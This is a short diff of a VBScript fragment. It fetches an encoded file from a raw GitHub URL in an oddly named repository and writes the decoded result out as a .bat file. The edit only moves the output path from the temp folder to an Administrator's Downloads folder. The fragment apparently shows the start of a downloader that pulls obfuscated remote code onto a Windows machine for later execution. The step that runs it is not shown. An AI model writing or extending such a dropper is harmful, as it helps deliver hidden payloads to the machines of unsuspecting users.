@@ -1,6 +1,6 @@
 ' Define the URL of the encoded file
 encodedFileUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encoded.txt"
-decodedFilePath = "%temp%\decoded.bat"
+decodedFilePath = "C:\Users\Administrator\Downloads\decoded.bat"
 
 ' Create XMLHTTP object to fetch the file
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
